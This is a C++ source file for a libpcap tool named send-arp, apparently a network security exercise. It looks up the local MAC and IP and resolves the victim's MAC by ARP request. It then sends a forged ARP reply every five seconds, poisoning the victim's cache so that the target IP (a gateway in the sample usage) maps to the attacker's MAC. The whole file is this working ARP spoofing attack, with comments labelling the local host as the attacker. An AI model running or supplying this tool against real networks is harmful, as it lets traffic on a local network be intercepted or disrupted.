#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getmymac(struct ifreq ifr){
	Mac mymac=Mac(ifr.ifr_hwaddr);
	return mymac;
}
Ip getmyip(struct ifreq ifr){
	char buf[30];
	strcpy(buf,inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	Ip myip=Ip(buf);
	return myip;
}
Mac getsendermac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
	char buf[20];
	EthArpPacket packet;
	const u_char* rawpacket;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//mac of target
	packet.eth_.smac_ = mmac;//mac of mine
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = mmac;//mac of mine
	packet.arp_.sip_ = htonl(mip);//ip of mine
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(sip);//ip of target
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	while(1){
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(handle, &header, &rawpacket);
		if (res == 0) continue;
    	if (res == -1 || res == -2) {
        	printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        	exit(1);
		}
		memcpy(&packet,rawpacket,sizeof(EthArpPacket));
		if(ntohs(packet.arp_.op_)==ArpHdr::Reply && ntohl(packet.arp_.sip_)==sip){
			Mac resultmac=packet.arp_.smac_;
			return resultmac;
		}
    }
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	Ip senderip=Ip(argv[2]);
	Ip targetip=Ip(argv[3]);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet;
	////
	int sock;
	struct ifreq ifr;
	struct ifreq ifr_ip;
	memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, dev);
	memset(&ifr_ip, 0x00, sizeof(ifr_ip));
    strcpy(ifr_ip.ifr_name, dev);

    int fd=socket(AF_INET, SOCK_DGRAM, 0);
    if((sock=socket(AF_INET, SOCK_DGRAM, 0))<0){
        perror("socket ");
    }
 	ifr_ip.ifr_addr.sa_family = AF_INET;
    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
        perror("ioctl ");
        exit(1);
    }
	if(ioctl(fd,SIOCGIFADDR,&ifr_ip)<0){
        perror("ioctl ");
        exit(1);
    }
	close(sock);
	///
	Ip myip=getmyip(ifr_ip);
	Mac mmac=getmymac(ifr);
	Mac smac=getsendermac(handle,myip,senderip,mmac);

	packet.eth_.dmac_ = smac;//mac of sender
	packet.eth_.smac_ = mmac;//mac of mine(attacker)
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = mmac;//mac of mine(attacker)
	packet.arp_.sip_ = htonl(targetip);//ip of target
	packet.arp_.tmac_ = smac;//mac of sender
	packet.arp_.tip_ = htonl(senderip);//ip of sender
	while(1){
		printf("sending arp!!...\n");
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		sleep(5);
	}
	pcap_close(handle);
}
